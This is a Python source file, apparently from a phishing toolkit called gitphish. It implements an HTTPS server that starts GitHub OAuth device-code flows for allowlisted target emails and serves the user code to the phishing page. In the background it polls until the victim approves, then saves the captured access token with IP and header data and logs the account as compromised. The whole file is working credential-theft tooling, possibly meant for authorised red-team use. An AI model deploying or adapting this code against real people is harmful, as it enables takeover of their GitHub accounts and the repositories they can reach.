import logging
from threading import Thread
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import ssl
import json
from datetime import datetime
import os
import sys
from typing import Dict
from gitphish.config.auth import GitHubAuthConfig
from gitphish.core.clients.auth.github_oauth_client import GitHubDeviceAuth
from gitphish.models.auth_attempts.auth import DeviceAuthResult
from gitphish.core.common.security.ssl_generator import (
    generate_self_signed_cert,
    check_cert_exists,
    find_free_port,
)
from gitphish.core.accounts.services.compromised_service import (
    CompromisedGitHubAccountService,
)
from gitphish.core.common.file import TokenStorageManager

# Default certificate paths
DEFAULT_CERT_PATH = "fullchain.pem"
DEFAULT_KEY_PATH = "privkey.pem"

# Dev mode certificate paths
DEV_CERT_PATH = "dev_cert.pem"
DEV_KEY_PATH = "dev_key.pem"


class GitHubAuthServer:
    """Handles GitHub device code authentication via HTTP server."""

    def __init__(
        self,
        github_config: GitHubAuthConfig,
        host: str = "0.0.0.0",
        port: int = 443,
        cert_path: str = DEFAULT_CERT_PATH,
        key_path: str = DEFAULT_KEY_PATH,
        dev_mode: bool = False,
    ):
        self.github_config = github_config
        self.host = host
        self.port = port
        self.cert_path = cert_path
        self.key_path = key_path
        self.dev_mode = dev_mode

        self.auth_client = GitHubDeviceAuth(github_config)
        self.app = Flask(__name__)

        # Load allowlisted emails
        self.allowlisted_emails = self._load_allowlist()

        self._setup_cors()
        self._setup_routes()

        self.auth_threads: Dict[str, Thread] = {}
        self.auth_results: Dict[str, DeviceAuthResult] = {}

        # Create necessary directories
        os.makedirs("data/logs", exist_ok=True)
        os.makedirs("data/auth_attempts", exist_ok=True)
        os.makedirs("data/successful_tokens", exist_ok=True)

        # Configure logging to both file and terminal
        self._setup_logging()

    def _load_allowlist(self) -> set:
        """Load allowlisted emails from file."""
        try:
            allowlist_file = "data/allowlist.txt"
            if not os.path.exists(allowlist_file):
                print(
                    f"\n⚠️  Warning: {allowlist_file} not found. "
                    "Creating empty allowlist."
                )
                with open(allowlist_file, "w") as f:
                    f.write("# One email per line\n")
                return set()

            with open(allowlist_file, "r") as f:
                # Skip comments and empty lines, strip whitespace
                emails = {
                    line.strip()
                    for line in f
                    if line.strip() and not line.startswith("#")
                }
                print(f"\n📋 Loaded {len(emails)} allowlisted emails")
                return emails
        except Exception as e:
            print(f"\n❌ Error loading allowlist: {str(e)}")
            return set()

    def _setup_logging(self):
        """Configure logging to output to both file and terminal."""
        # Create formatter
        formatter = logging.Formatter("%(asctime)s - %(message)s")

        # Setup file handler
        os.makedirs("data/logs", exist_ok=True)
        file_handler = logging.FileHandler("data/logs/visitor_data.log")
        file_handler.setFormatter(formatter)

        # Setup console handler
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setFormatter(formatter)

        # Configure logger
        self.logger = logging.getLogger("GitHubAuthServer")
        self.logger.setLevel(logging.INFO)

        # Remove any existing handlers
        self.logger.handlers = []

        # Add our handlers
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

        # Prevent the logger from propagating to the root logger
        self.logger.propagate = False

    def _save_successful_token(self, email: str, access_token: str, visitor_data: dict):
        """Save successful authentication token and metadata."""
        # Use the centralized TokenStorageManager
        token_filename = TokenStorageManager.save_token_with_metadata(
            token=access_token,
            email=email,
            visitor_data=visitor_data,
        )
        print(f"\n🎯 TOKEN CAPTURED! Saved to: {token_filename}")
        print(f"📧 Email: {email}")
        print(f"🕒 Time: {datetime.now().strftime('%Y%m%d_%H%M%S')}")
        print()
        # Record compromised account
        compromised_service = CompromisedGitHubAccountService()
        compromised_service.record_compromised_account(
            email, access_token, visitor_data
        )
        return token_filename

    def _setup_cors(self):
        """Configure CORS settings."""
        CORS(
            self.app,
            origins=["*"],
            methods=["GET", "POST", "OPTIONS"],
            allow_headers=["Content-Type", "Authorization", "Accept", "Origin"],
            supports_credentials=False,
            send_wildcard=True,
            automatic_options=True
        )

    def _log_data(self, data: dict, prefix: str = ""):
        """Log data to both file and console with pretty formatting."""
        # Remove sensitive data before logging
        if isinstance(data, dict):
            data = data.copy()
            data.pop("access_token", None)
            if "device_code_data" in data:
                data["device_code_data"] = {
                    k: v
                    for k, v in data["device_code_data"].items()
                    if k not in ["device_code"]
                }

        formatted_json = json.dumps(data, indent=2)
        if prefix in [
            "Error",
            "Polling Error",
            "Server Error",
            "Validation Error",
        ]:
            self.logger.error(f"{prefix}:\n{formatted_json}")

    def _setup_routes(self):
        """Set up Flask routes."""

        @self.app.route("/ingest", methods=["POST"])
        def handle_auth():

            try:
                visitor_data = request.get_json(silent=True) or {}
                visitor_data["ip_address"] = request.remote_addr
                visitor_data["headers"] = dict(request.headers)
                visitor_data["timestamp"] = datetime.now().isoformat()

                # Log every /ingest request at INFO level
                self.logger.info(
                    f"/ingest request: email={visitor_data.get('email')}, "
                    f"ip={visitor_data['ip_address']}"
                )

                self._log_data(visitor_data, "Incoming Request Data")

                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                auth_attempt_file = f"data/auth_attempts/attempt_{timestamp}.json"
                with open(auth_attempt_file, "w") as f:
                    json.dump(visitor_data, indent=2, fp=f)

                email = visitor_data.get("email")
                if not email:
                    error_msg = "Email is required"
                    self._log_data({"error": error_msg}, "Validation Error")
                    error_response = {"status": "error", "message": error_msg}
                    return jsonify(error_response), 400

                # Check if email is allowlisted (reloads file each time)
                if not self.is_email_allowlisted(email):
                    print(f"\n🚫 Rejected non-allowlisted email: {email}")
                    self._log_data(
                        {"email": email, "error": "Email not allowlisted"},
                        "Access Denied",
                    )

                    error_response = {
                        "status": "error",
                        "message": "Access denied",  # Generic error for security
                    }
                    return jsonify(error_response), 403

                print(f"\n✅ Allowlisted email accepted: {email}")

                # Use the main auth client
                auth_client = self.auth_client

                code_data = auth_client.initiate_device_flow()

                # Start polling in background with visitor data
                self._start_polling_thread(
                    email,
                    code_data["device_code"],
                    visitor_data,
                    auth_client,
                    auth_attempt_file,
                )

                response_data = {
                    "status": "success",
                    "user_code": code_data["user_code"],
                    "verification_uri": code_data.get(
                        "verification_uri", "https://github.com/login/device"
                    ),
                    "expires_in": code_data.get("expires_in", 900),
                }

                self._log_data(response_data, "Response Data")

                return jsonify(response_data), 200

            except Exception as e:
                error_data = {
                    "status": "error",
                    "message": str(e),
                    "timestamp": datetime.now().isoformat(),
                }
                self._log_data(error_data, "Error")
                return jsonify(error_data), 500

    def _start_polling_thread(
        self,
        email: str,
        device_code: str,
        visitor_data: dict,
        auth_client: GitHubDeviceAuth,
        attempt_file_path: str,
    ):
        """Start a background thread to poll for authentication."""

        def poll_thread():
            try:
                print(f"\n⏳ Started polling for {email}...")
                self.logger.info(f"Starting polling for {email}")

                access_token = auth_client.poll_for_token(
                    device_code, self.github_config.default_interval, email
                )

                if access_token:
                    # Save successful token to separate directory
                    token_filename = self._save_successful_token(
                        email, access_token, visitor_data
                    )
                    self.logger.info(
                        f"Authentication success for {email}, token saved to {token_filename}"
                    )

                    self.auth_results[email] = DeviceAuthResult(
                        email=email,
                        access_token=access_token,
                        status="SUCCESS",
                    )
                else:
                    # Check if timeout
                    result = auth_client._auth_results.get(email)
                    if result and result.status == "TIMEOUT":
                        try:
                            with open(attempt_file_path, "r+") as f:
                                data = json.load(f)
                                data["timed_out"] = True
                                f.seek(0)
                                json.dump(data, f, indent=2)
                                f.truncate()
                        except Exception as e:
                            self.logger.error(
                                f"Failed to mark attempt as timed out: {e}"
                            )
                    print(f"\n❌ Authentication failed for {email}")
                    self.logger.info(f"Authentication failed for {email}")

                    self.auth_results[email] = DeviceAuthResult(
                        email=email, access_token=None, status="FAILED"
                    )

            except Exception as e:
                print(f"\n⚠️ Error during polling for {email}: {str(e)}")
                self.logger.error(f"Polling error for {email}: {str(e)}")

            finally:
                # Clean up auth client if it's different from the main one
                if auth_client != self.auth_client:
                    auth_client.close()

        thread = Thread(target=poll_thread)
        thread.daemon = True
        thread.start()
        self.auth_threads[email] = thread

    def _setup_ssl_context(self):
        """Setup SSL context with automatic dev mode certificate generation."""
        if self.dev_mode:
            # In dev mode, use self-signed certificates
            cert_path = DEV_CERT_PATH
            key_path = DEV_KEY_PATH
            # Check if dev certificates exist, if not generate them
            if not check_cert_exists(cert_path, key_path):
                # print(f"\n🔧 Dev mode: Generating self-signed certificates...")
                cert_path, key_path = generate_self_signed_cert(
                    cert_path=cert_path,
                    key_path=key_path,
                    common_name=(self.host if self.host != "0.0.0.0" else "localhost"),
                )
            else:
                # print(f"\n🔧 Dev mode: Using existing self-signed certificates")
                # print(f"   📄 Certificate: {cert_path}")
                # print(f"   🔑 Private Key: {key_path}")
                pass

            self.cert_path = cert_path
            self.key_path = key_path

            # For dev mode, use a different port if 443 is not available and not explicitly set
            if self.port == 443:
                try:
                    import socket

                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.bind((self.host, self.port))
                except OSError:
                    # Port 443 is in use, find an alternative
                    self.port = find_free_port(8443, 100)
                    print(f"   🔀 Port 443 unavailable, using port {self.port}")

        else:
            # Production mode - check if certificates exist
            if not check_cert_exists(self.cert_path, self.key_path):
                raise FileNotFoundError(
                    f"SSL certificates not found. In production mode, you must provide valid certificates:\n"
                    f"  Certificate: {self.cert_path}\n"
                    f"  Private Key: {self.key_path}\n"
                    f"  \n"
                    f"💡 Tip: Use --dev-mode flag for automatic self-signed certificates during development"
                )

        # Create SSL context
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(self.cert_path, self.key_path)
        return context

    def run(self):
        """Run the Flask server with SSL configuration."""
        try:
            # Setup SSL context (with automatic cert generation in dev mode)
            context = self._setup_ssl_context()
            self.logger.info(
                f"Server starting on {self.host}:{self.port} "
                f"(dev_mode={self.dev_mode})"
            )
            self._log_data(
                {
                    "action": "server_start",
                    "host": self.host,
                    "port": self.port,
                    "cert_path": self.cert_path,
                    "dev_mode": self.dev_mode,
                    "timestamp": datetime.now().isoformat(),
                },
                "Server Starting",
            )
            self.app.run(host=self.host, port=self.port, ssl_context=context)
        except Exception as e:
            print(f"\n💥 Server Error: {str(e)}\n")
            self._log_data(
                {
                    "action": "server_error",
                    "error": str(e),
                    "timestamp": datetime.now().isoformat(),
                },
                "Server Error",
            )
            raise
        finally:
            self.logger.info("Server shutting down.")

    def is_email_allowlisted(self, email: str) -> bool:
        """Check if the email is currently allowlisted by reloading the file."""
        return email in self._load_allowlist()


def start_github_auth_server(
    client_id: str,
    org_name: str,
    host: str = "0.0.0.0",
    port: int = 443,
    cert_path: str = DEFAULT_CERT_PATH,
    key_path: str = DEFAULT_KEY_PATH,
    dev_mode: bool = False,
):
    """
    Start the GitHub authentication server with the given parameters.
    """
    github_config = GitHubAuthConfig(client_id=client_id, org_name=org_name)
    server = GitHubAuthServer(
        github_config=github_config,
        host=host,
        port=port,
        cert_path=cert_path,
        key_path=key_path,
        dev_mode=dev_mode,
    )
    server.run()
